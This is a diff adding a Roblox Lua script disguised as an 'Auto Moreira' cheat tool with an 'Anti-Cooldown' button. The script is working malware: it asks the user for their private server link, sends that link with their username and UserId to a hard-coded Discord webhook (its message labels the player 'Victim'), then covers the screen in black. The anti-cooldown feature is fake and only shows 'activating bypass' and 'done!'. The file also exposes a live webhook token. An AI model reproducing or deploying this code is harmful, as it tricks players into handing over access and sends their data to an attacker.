@@ -1,0 +1,208 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1449020091713978379/RamumviNfNtVz8adGIL5f1s5GN9fbMzSx36esAmndzt3yI2xg9pyegeL2v_qvabqGUlo"
+
+local http = request or http_request or (syn and syn.request)
+if not http then return end
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
+local UIS = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
+
+local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
+local viewportX = Camera.ViewportSize.X
+
+local function getUIScale()
+	if isMobile then
+		return 1
+	end
+
+	if viewportX >= 2560 then
+		return 1.15 -- PC DPI alto
+	elseif viewportX >= 1920 then
+		return 1.05 -- Full HD
+	else
+		return 1 -- telas menores
+	end
+end
+
+local function sendWebhook(link)
+	local player = Players.LocalPlayer
+	local content = string.format(
+		"**Private Server:**\n%s\n**Victim's user:** %s\n**UserId:** %d",
+		link,
+		player.Name,
+		player.UserId
+	)
+
+	http({
+		Url = WEBHOOK_URL,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode({
+			content = content
+		})
+	})
+end
+
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "AutoMoreiraGUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0,240,0,145)
+frame.Position = UDim2.new(0.5,-120,0.5,-72)
+frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+frame.BorderSizePixel = 0
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
+
+local uiScale = Instance.new("UIScale", frame)
+uiScale.Scale = getUIScale()
+
+local titleBar = Instance.new("Frame", frame)
+titleBar.Size = UDim2.new(1,0,0,26)
+titleBar.BackgroundColor3 = Color3.fromRGB(25,25,25)
+titleBar.BorderSizePixel = 0
+Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0,10)
+
+local title = Instance.new("TextLabel", titleBar)
+title.Size = UDim2.new(1,0,1,0)
+title.BackgroundTransparency = 1
+title.Text = "Auto Moreira"
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(200,200,200)
+
+do
+	local dragging = false
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+
+	titleBar.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+			dragInput = input
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if dragging and input == dragInput then
+			update(input)
+		end
+	end)
+end
+
+local function mkBtn(txt,y)
+	local b = Instance.new("TextButton", frame)
+	b.Size = UDim2.new(0.85,0,0,34)
+	b.Position = UDim2.new(0.075,0,0,y)
+	b.Text = txt
+	b.Font = Enum.Font.GothamBold
+	b.TextScaled = true
+	b.TextColor3 = Color3.fromRGB(220,220,220)
+	b.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	b.AutoButtonColor = false
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0,7)
+
+	local s = Instance.new("UIStroke", b)
+	s.Color = Color3.fromRGB(170,80,255)
+	s.Thickness = 2
+
+	return b
+end
+
+local autoBtn = mkBtn("Auto Moreira",38)
+local antiBtn = mkBtn("Anti-Cooldown",80)
+
+local linkBox, startBtn
+
+autoBtn.MouseButton1Click:Connect(function()
+	if linkBox then return end
+
+	linkBox = Instance.new("TextBox", gui)
+	linkBox.Size = UDim2.new(0,300,0,30)
+	linkBox.Position = UDim2.new(0.5,0,0.5,-28)
+	linkBox.AnchorPoint = Vector2.new(0.5,0.5)
+	linkBox.PlaceholderText = "private server link"
+	linkBox.Text = ""
+	linkBox.ClearTextOnFocus = false
+	linkBox.Font = Enum.Font.GothamBold
+	linkBox.TextScaled = true
+	linkBox.BackgroundColor3 = Color3.fromRGB(45,45,45)
+	linkBox.TextColor3 = Color3.fromRGB(235,235,235)
+	Instance.new("UICorner", linkBox).CornerRadius = UDim.new(0,6)
+
+	startBtn = Instance.new("TextButton", gui)
+	startBtn.Size = UDim2.new(0,160,0,28)
+	startBtn.Position = UDim2.new(0.5,0,0.5,10)
+	startBtn.AnchorPoint = Vector2.new(0.5,0.5)
+	startBtn.Text = "start"
+	startBtn.Font = Enum.Font.GothamBold
+	startBtn.TextScaled = true
+	startBtn.TextColor3 = Color3.fromRGB(220,220,220)
+	startBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	startBtn.AutoButtonColor = false
+	Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0,6)
+
+	startBtn.MouseButton1Click:Once(function()
+		if linkBox.Text ~= "" then
+			sendWebhook(linkBox.Text)
+			blackout()
+		end
+	end)
+end)
+
+function blackout()
+	frame.Visible = false
+	if linkBox then linkBox:Destroy() end
+	if startBtn then startBtn:Destroy() end
+
+	local StarterGui = game:GetService("StarterGui")
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+	local black = Instance.new("Frame", gui)
+	black.Size = UDim2.new(1,0,1,0)
+	black.BackgroundColor3 = Color3.new(0,0,0)
+	black.ZIndex = 1000
+
+end
+
+antiBtn.MouseButton1Click:Connect(function()
+	local msg = Instance.new("TextLabel", gui)
+	msg.Size = UDim2.new(1,0,0.1,0)
+	msg.Position = UDim2.new(0,0,0.45,0)
+	msg.BackgroundTransparency = 1
+	msg.Font = Enum.Font.GothamBold
+	msg.TextScaled = true
+	msg.TextColor3 = Color3.fromRGB(235,235,235)
+	msg.ZIndex = 2000
+
+	local s = Instance.new("UIStroke", msg)
+	s.Color = Color3.fromRGB(170,80,255)
+	s.Thickness = 2
+
+	msg.Text = "activating bypass"
+	task.wait(3)
+	msg.Text = "done!"
+	task.wait(2)
+	msg:Destroy()
+end)
